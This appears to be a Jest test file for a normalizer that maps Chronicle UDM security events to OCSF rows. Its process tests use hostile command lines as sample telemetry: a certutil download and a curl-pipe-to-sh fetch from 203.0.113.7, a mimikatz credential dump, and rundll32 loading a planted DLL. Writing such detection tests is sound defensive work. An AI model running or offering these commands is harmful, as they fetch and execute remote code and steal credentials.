import { describe, expect, test } from "@jest/globals";
import { JSONObject } from "../../../Types/JSON";
import NormalizedSecurityEvent from "../../../Types/SecurityEvent/NormalizedSecurityEvent";
import OcsfSeverity from "../../../Types/SecurityEvent/OcsfSeverity";
import UdmNormalizer, {
  prettifyUdmEventType,
} from "../../../Utils/SecurityEvent/UdmNormalizer";
import { contentHashEventUid } from "../../../Utils/SecurityEvent/NormalizerHelpers";

/*
 * UDM reaches ingest in two spellings (snake_case exports, camelCase API
 * responses) and both must land on identical rows — a spelling the reader
 * misses does not error, it silently produces an empty column and the event
 * still "works", so only tests catch the drift. The same goes for the
 * event_type -> OCSF class table (an unmapped type must degrade to class 0
 * with a readable name, never be dropped), for severity being the MAX
 * across multiple security_result verdicts (first-wins would let a noisy
 * ALLOW verdict mask a CRITICAL one), and for the eventUid falling back to
 * a content hash so idless sources stay deduplicatable.
 */
describe("UdmNormalizer", () => {
  describe("isUdmEvent", () => {
    test("detects both spellings of metadata.event_type", () => {
      expect(
        UdmNormalizer.isUdmEvent({ metadata: { event_type: "USER_LOGIN" } }),
      ).toBe(true);
      expect(
        UdmNormalizer.isUdmEvent({ metadata: { eventType: "USER_LOGIN" } }),
      ).toBe(true);
    });

    test("rejects payloads without an event type", () => {
      expect(UdmNormalizer.isUdmEvent({})).toBe(false);
      expect(UdmNormalizer.isUdmEvent({ metadata: {} })).toBe(false);
      expect(UdmNormalizer.isUdmEvent({ event_type: "USER_LOGIN" })).toBe(
        false,
      );
    });
  });

  describe("prettifyUdmEventType", () => {
    test.each<[string, string]>([
      ["NETWORK_CONNECTION", "Network Connection"],
      ["USER_LOGIN", "User Login"],
      ["MUTEX_CREATION", "Mutex Creation"],
      ["SCAN", "Scan"],
    ])("%s -> %s", (input: string, expected: string) => {
      expect(prettifyUdmEventType(input)).toBe(expected);
    });
  });

  describe("normalize: full snake_case USER_LOGIN event", () => {
    const payload: JSONObject = {
      metadata: {
        id: "evt-123",
        event_type: "USER_LOGIN",
        event_timestamp: "2024-05-01T12:00:00Z",
        vendor_name: "Acme",
        product_name: "AcmeAuth",
        description: "User login succeeded",
      },
      principal: {
        user: { userid: "alice" },
        hostname: "workstation-1",
        ip: ["10.0.0.1", "10.0.0.2"],
        process: {
          file: { full_path: "/usr/bin/sshd" },
          command_line: "sshd -D",
        },
      },
      target: {
        user: { userid: "bob" },
        hostname: "server-1",
        ip: ["192.168.1.10"],
        port: 22,
        resource: { name: "prod-db" },
      },
      security_result: [
        {
          severity: "LOW",
          action: ["ALLOW"],
          rule_name: "Allowed login",
          rule_id: "rule-1",
          summary: "login allowed",
          attack_details: {
            tactics: [{ id: "TA0001", name: "Initial Access" }],
            techniques: [{ id: "T1078", name: "Valid Accounts" }],
          },
        },
        {
          severity: "CRITICAL",
          attack_details: {
            tactics: [{ id: "TA0001" }, { id: "TA0006" }],
            techniques: [{ id: "T1078" }, { id: "T1110" }],
          },
        },
      ],
    };

    const result: NormalizedSecurityEvent = UdmNormalizer.normalize(payload);

    test("USER_LOGIN maps to OCSF Authentication (3002) / Logon", () => {
      expect(result.classUid).toBe(3002);
      expect(result.className).toBe("Authentication");
      expect(result.activityName).toBe("Logon");
      expect(result.categoryUid).toBe(3);
      expect(result.categoryName).toBe("Identity & Access Management");
    });

    test("severity is the MAX across security_result entries", () => {
      expect(result.severityName).toBe(OcsfSeverity.Critical);
      expect(result.severityId).toBe(5);
    });

    test("ALLOW action -> Allowed status", () => {
      expect(result.statusName).toBe("Allowed");
    });

    test("rule provenance comes from the first entry naming a rule", () => {
      expect(result.ruleId).toBe("rule-1");
      expect(result.ruleName).toBe("Allowed login");
    });

    test("attack_details tactics/techniques merge and dedupe", () => {
      expect(result.mitreTactics).toEqual(["TA0001", "TA0006"]);
      expect(result.mitreTechniques).toEqual(["T1078", "T1110"]);
    });

    test("principal extraction, first ip wins the column", () => {
      expect(result.principalUser).toBe("alice");
      expect(result.principalHost).toBe("workstation-1");
      expect(result.principalIp).toBe("10.0.0.1");
      expect(result.principalProcess).toBe("/usr/bin/sshd");
    });

    test("target extraction", () => {
      expect(result.targetUser).toBe("bob");
      expect(result.targetHost).toBe("server-1");
      expect(result.targetIp).toBe("192.168.1.10");
      expect(result.targetPort).toBe(22);
      expect(result.targetResource).toBe("prod-db");
    });

    test("eventUid comes from metadata.id", () => {
      expect(result.eventUid).toBe("evt-123");
    });

    test("metadata.description wins the message", () => {
      expect(result.message).toBe("User login succeeded");
    });

    test("vendor and product come from metadata", () => {
      expect(result.vendorName).toBe("Acme");
      expect(result.productName).toBe("AcmeAuth");
    });

    test("time parses metadata.event_timestamp RFC3339", () => {
      expect(result.time.getTime()).toBe(1714564800000);
    });

    test("observables carry every entity, including non-column ips", () => {
      expect(result.observables).toEqual([
        "alice",
        "bob",
        "workstation-1",
        "server-1",
        "10.0.0.1",
        "10.0.0.2",
        "192.168.1.10",
      ]);
    });

    test("attributes flatten the whole payload", () => {
      expect(result.attributes["metadata.event_type"]).toBe("USER_LOGIN");
      expect(result.attributes["principal.ip"]).toBe("10.0.0.1,10.0.0.2");
      expect(result.attributes["security_result.0.severity"]).toBe("LOW");
      expect(result.attributes["security_result.1.severity"]).toBe("CRITICAL");
    });
  });

  describe("normalize: camelCase spelling lands on the same row", () => {
    const payload: JSONObject = {
      metadata: {
        eventType: "USER_LOGIN",
        eventTimestamp: "2024-05-01T12:00:00Z",
        vendorName: "Acme",
        productName: "AcmeAuth",
        productLogId: "log-42",
      },
      principal: {
        user: { userDisplayName: "Alice Doe" },
        asset: { hostname: "asset-host" },
      },
      securityResult: [
        {
          severity: "HIGH",
          action: ["BLOCK"],
          ruleName: "Blocked rule",
          ruleId: "r-9",
          attackDetails: {
            tactics: [{ id: "TA0006" }],
            techniques: [{ id: "T1110" }],
          },
        },
      ],
    };

    const result: NormalizedSecurityEvent = UdmNormalizer.normalize(payload);

    test("class mapping still fires", () => {
      expect(result.classUid).toBe(3002);
      expect(result.className).toBe("Authentication");
      expect(result.activityName).toBe("Logon");
    });

    test("severity, BLOCK -> Blocked, and camelCase rule fields", () => {
      expect(result.severityName).toBe(OcsfSeverity.High);
      expect(result.severityId).toBe(4);
      expect(result.statusName).toBe("Blocked");
      expect(result.ruleName).toBe("Blocked rule");
      expect(result.ruleId).toBe("r-9");
    });

    test("camelCase attackDetails still yields MITRE refs", () => {
      expect(result.mitreTactics).toEqual(["TA0006"]);
      expect(result.mitreTechniques).toEqual(["T1110"]);
    });

    test("camelCase entity fallbacks: display name and asset hostname", () => {
      expect(result.principalUser).toBe("Alice Doe");
      expect(result.principalHost).toBe("asset-host");
    });

    test("eventUid falls back to metadata.productLogId", () => {
      expect(result.eventUid).toBe("log-42");
    });

    test("camelCase metadata fields", () => {
      expect(result.vendorName).toBe("Acme");
      expect(result.productName).toBe("AcmeAuth");
      expect(result.time.getTime()).toBe(1714564800000);
    });
  });

  describe("normalize: class mapping table", () => {
    test("NETWORK_DNS -> DNS Activity (4003)", () => {
      const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
        metadata: { event_type: "NETWORK_DNS" },
      });

      expect(result.classUid).toBe(4003);
      expect(result.className).toBe("DNS Activity");
      expect(result.activityName).toBe("Query");
      expect(result.categoryUid).toBe(4);
      expect(result.categoryName).toBe("Network Activity");
    });

    test("PROCESS_LAUNCH -> Process Activity (1007)", () => {
      const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
        metadata: { event_type: "PROCESS_LAUNCH" },
      });

      expect(result.classUid).toBe(1007);
      expect(result.className).toBe("Process Activity");
      expect(result.activityName).toBe("Launch");
      expect(result.categoryUid).toBe(1);
      expect(result.categoryName).toBe("System Activity");
    });

    test("unmapped event type keeps class 0 with a prettified name", () => {
      const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
        metadata: { event_type: "MUTEX_CREATION" },
      });

      expect(result.classUid).toBe(0);
      expect(result.className).toBe("Mutex Creation");
      expect(result.activityName).toBe("");
      expect(result.categoryUid).toBe(0);
      expect(result.categoryName).toBe("Uncategorized");
    });
  });

  describe("normalize: severity aggregation", () => {
    test("a later, lower verdict does not demote an earlier high one", () => {
      const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
        metadata: { event_type: "USER_LOGIN" },
        security_result: [{ severity: "HIGH" }, { severity: "ERROR" }],
      });

      // ERROR grades as Medium (3), below High (4) — High must stand.
      expect(result.severityName).toBe(OcsfSeverity.High);
      expect(result.severityId).toBe(4);
    });

    test("no security_result -> Unknown", () => {
      const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
        metadata: { event_type: "USER_LOGIN" },
      });

      expect(result.severityName).toBe(OcsfSeverity.Unknown);
      expect(result.severityId).toBe(0);
    });
  });

  describe("normalize: eventUid fallback", () => {
    test("without any id, eventUid is the stable content hash", () => {
      const payload: JSONObject = {
        metadata: { event_type: "NETWORK_DNS" },
        network: { dns: { questions: [{ name: "example.com" }] } },
      };

      const result: NormalizedSecurityEvent = UdmNormalizer.normalize(payload);

      expect(result.eventUid).toMatch(/^sha256:[0-9a-f]{64}$/);
      expect(result.eventUid).toBe(contentHashEventUid(payload));
    });

    test("DNS question name lands in observables", () => {
      const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
        metadata: { event_type: "NETWORK_DNS" },
        network: { dns: { questions: [{ name: "example.com" }] } },
      });

      expect(result.observables).toEqual(["example.com"]);
    });
  });

  describe("normalize: message precedence", () => {
    test("falls back to the security_result summary", () => {
      const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
        metadata: { event_type: "USER_LOGIN" },
        security_result: [{ summary: "login blocked by policy" }],
      });

      expect(result.message).toBe("login blocked by policy");
    });

    test("falls back to the prettified event type last", () => {
      const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
        metadata: { event_type: "USER_LOGIN" },
      });

      expect(result.message).toBe("User Login");
    });
  });

  describe("normalize: time fallback", () => {
    test("without a source timestamp, time is 'now'", () => {
      const before: number = Date.now();

      const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
        metadata: { event_type: "USER_LOGIN" },
      });

      const after: number = Date.now();

      expect(result.time.getTime()).toBeGreaterThanOrEqual(before);
      expect(result.time.getTime()).toBeLessThanOrEqual(after);
    });
  });
});

/*
 * A UDM PROCESS_* event is about its target process; in a PROCESS_LAUNCH
 * the principal's process started it. Any other event is about the
 * principal's process. Both spellings of every key are read.
 */
describe("UdmNormalizer: the process an event is about", () => {
  test("a PROCESS_LAUNCH: the target's process, and the principal's as its parent", () => {
    const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
      metadata: { event_type: "PROCESS_LAUNCH" },
      principal: {
        hostname: "wkstn-042",
        process: {
          pid: "4120",
          file: { full_path: "C:\\Windows\\explorer.exe" },
          command_line: "C:\\Windows\\Explorer.EXE",
        },
      },
      target: {
        process: {
          pid: "6532",
          file: { full_path: "C:\\Windows\\System32\\certutil.exe" },
          command_line: "certutil.exe -urlcache -f http://203.0.113.7/a.exe",
          parent_process: { pid: "4120" },
        },
      },
    });

    expect(result.processName).toBe("certutil.exe");
    expect(result.processPath).toBe("C:\\Windows\\System32\\certutil.exe");
    expect(result.processCommandLine).toBe(
      "certutil.exe -urlcache -f http://203.0.113.7/a.exe",
    );
    expect(result.parentProcessName).toBe("explorer.exe");
    expect(result.parentProcessPath).toBe("C:\\Windows\\explorer.exe");
    expect(result.parentProcessCommandLine).toBe("C:\\Windows\\Explorer.EXE");
    // principalProcess keeps the principal's path, as it always has.
    expect(result.principalProcess).toBe("C:\\Windows\\explorer.exe");
  });

  test("the camelCase spelling of the Chronicle API reads the same", () => {
    const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
      metadata: { eventType: "PROCESS_LAUNCH" },
      principal: {
        process: {
          file: { fullPath: "/usr/sbin/cron" },
          commandLine: "/usr/sbin/CRON -f",
        },
      },
      target: {
        process: {
          file: { fullPath: "/usr/bin/sh" },
          commandLine: "/bin/sh -c curl -s http://203.0.113.7/x | sh",
          parentProcess: { file: { fullPath: "/usr/sbin/cron" } },
        },
      },
    });

    expect(result.processPath).toBe("/usr/bin/sh");
    expect(result.processName).toBe("sh");
    expect(result.processCommandLine).toBe(
      "/bin/sh -c curl -s http://203.0.113.7/x | sh",
    );
    expect(result.parentProcessPath).toBe("/usr/sbin/cron");
    expect(result.parentProcessCommandLine).toBe("/usr/sbin/CRON -f");
  });

  test("a PROCESS_OPEN: the principal opened the process, it is not its parent", () => {
    const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
      metadata: { event_type: "PROCESS_OPEN" },
      principal: {
        process: {
          file: { full_path: "C:\\Users\\Public\\mimikatz.exe" },
          command_line: "mimikatz.exe sekurlsa::logonpasswords",
        },
      },
      target: {
        process: {
          file: { full_path: "C:\\Windows\\System32\\lsass.exe" },
          parent_process: {
            file: { full_path: "C:\\Windows\\System32\\wininit.exe" },
          },
        },
      },
    });

    expect(result.processName).toBe("lsass.exe");
    expect(result.parentProcessName).toBe("wininit.exe");
    expect(result.parentProcessCommandLine).toBe("");
  });

  test.each(["NETWORK_CONNECTION", "FILE_CREATION", "PROCESS_MODULE_LOAD"])(
    "a %s is about the principal's process, with its parent",
    (eventType: string) => {
      const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
        metadata: { event_type: eventType },
        principal: {
          process: {
            file: { full_path: "C:\\Windows\\System32\\rundll32.exe" },
            command_line: "rundll32.exe C:\\Users\\Public\\x.dll,Start",
            parent_process: {
              file: { full_path: "C:\\Windows\\System32\\cmd.exe" },
              command_line: "cmd.exe /c rundll32 x.dll,Start",
            },
          },
        },
        target: {
          process: { file: { full_path: "C:\\Users\\Public\\x.dll" } },
        },
      });

      expect(result.processPath).toBe("C:\\Windows\\System32\\rundll32.exe");
      expect(result.processCommandLine).toBe(
        "rundll32.exe C:\\Users\\Public\\x.dll,Start",
      );
      expect(result.parentProcessName).toBe("cmd.exe");
      expect(result.parentProcessCommandLine).toBe(
        "cmd.exe /c rundll32 x.dll,Start",
      );
    },
  );

  test("a USER_LOGIN with no process names none", () => {
    const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
      metadata: { event_type: "USER_LOGIN" },
      principal: { ip: ["203.0.113.7"] },
      target: { user: { userid: "alice" } },
    });

    expect(result.processName).toBe("");
    expect(result.processCommandLine).toBe("");
    expect(result.parentProcessName).toBe("");
  });
});
